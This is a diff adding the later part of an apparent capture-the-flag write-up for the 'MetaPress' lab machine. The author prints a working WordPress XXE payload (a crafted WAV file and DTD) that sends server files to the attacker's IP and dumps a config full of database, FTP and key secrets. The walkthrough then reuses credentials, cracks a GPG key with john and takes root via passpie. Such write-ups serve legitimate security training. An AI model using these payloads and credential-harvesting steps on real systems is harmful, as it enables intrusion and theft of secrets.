@@ -133,3 +133,193 @@ using the classic rockyou wordlist that. I had to decompress the rockyou file be
 utilizing the command, just so you know.
 
 We see that it found one password, the manager's which is "partylikearockstar".
+
+So we have a username and a password but we have to find out where to enter them.
+Although there is no login link in the page, based in our enumeration we know that
+there is a subdomain called "wp-admin". So if we go to http://metapress.htb/wp-admin
+we will encounter the Wordpress page for authentication, we enter the credentials
+and we are in!
+
+** Exploiting XXE
+
+Looking around the vulnerabilities of this version of Wordpress I encounter this
+article: https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
+It's a fascinating thing. It essentially uses the metadata of a WAVE file to
+inject payload and retrieve information.
+
+#+begin_src shell :results output :wrap "quote" :exports both
+echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.83:1234/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+#+end_src
+That is the code that the author suggests, the only thing we should change it's the
+ip, replacing it with our own and I also changed the port to 1234 for convenience.
+
+Now if we continue with the article we have to send this payload through a dtd file
+which will look like this:
+
+#+begin_src shell :results output :wrap "quote" :exports both
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.83:1234/?p=%file;'>">
+#+end_src
+
+Again we have to modify the ip and port.
+
+We will start a php server:
+#+begin_src shell :results output :wrap "quote" :exports both
+php -S 0.0.0.0:1234
+#+end_src
+
+And we go the the media page. Then click on add new and upload our payload.wav while
+the server is still running. We will get a huge, horrible looking output but we can
+decode it using:
+#+begin_src shell :results output :wrap "quote" :exports both
+echo -en <payload> | base64 -d
+#+end_src
+
+Now the output looks much more interesting since these is the passwd file of the
+machine we are trying to pawn. Of course if we analyze it there really is nothing
+we can do with this. But it is useful to know that the vulnerability can be
+exploited.
+
+If we modify the evil.dtd file that we created before to give us the config file of
+the page we might be more lucky.
+#+begin_src shell :results output :wrap "quote" :exports both
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.83:1234/?p=%file;'>">
+#+end_src
+
+So we upload the payload.wav file again and again we decode the output which will
+look like this:
+
+#+begin_src php :results output :wrap "quote" :exports both
+<?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+#+end_src
+
+There is a lot of hashes in there but the interesting thing is that we have a method:
+FTP, the user and the password (hashed). We already tried to connect to ftp and we
+couldn't so maybe this could prove useful.
+
+** Getting the credentials
+
+#+begin_src shell :results output :wrap "quote" :exports both
+ftp 10.10.11.186
+#+end_src
+And we enter our newly found credentials.
+
+If we list the files using ls, we will see two folders: blog and mailer.
+We cd to mailer and then download the send_email.php file with the get command.
+It will download to our current directory and if we cat it we can see that there are
+more credentials!
+
+In particular these two could be used for ssh access:
+#+begin_quote
+$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
+#+end_quote
+
+So we will do that:
+#+begin_src shell :results output :wrap "quote" :exports both
+ssh jnelson@metapress.htb
+#+end_src
+We input the password and we can see that it works!
+Now we can do an ls and find out that there is the user.txt file with the flag that
+we want.
+
+** Escalating the privileges
+
+If we try to use sudo we will see that we cannot. However we can see that there is a
+.passpie directory. Passpie is a password manager for Linux and there is a .keys
+file inside and a ssh directory. We don't really know if we can use this but it is
+worth a try.
+
+So we will copy the private key block of the .keys file to our machine and write it
+to a file called key. And use gpg2john to write it to another file unhashed:
+
+#+begin_src shell :results output :wrap "quote" :exports both
+gpg2john key > pass_hash
+#+end_src
+
+And run it through john again:
+#+begin_src shell :results output :wrap "quote" :exports both
+john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
+#+end_src
+And once it is done:
+#+begin_src shell :results output :wrap "quote" :exports both
+john --wordlist=/usr/share/wordlists/rockyou.txt pass_hash
+#+end_src
+
+Now we can see that the password is "blink182". We don't know what this is for but
+we can find out using:
+
+#+begin_src shell :results output :wrap "quote" :exports both
+passpie export pass
+#+end_src
+And entering "blink182" as the Passphrase. Now we can see that the root user has
+'p7qfAZt4_A1xo_0x' as password.
+
+So we will:
+#+begin_src shell :results output :wrap "quote" :exports both
+su root
+#+end_src
+And enter that as the password and we are in! We are root!
+
+So let's end this, let's go to /root/root.txt and extract our flag from there.
+
+And that is it! I hope this was informative, I am still a noob but I had a great
+time trying to crack this.
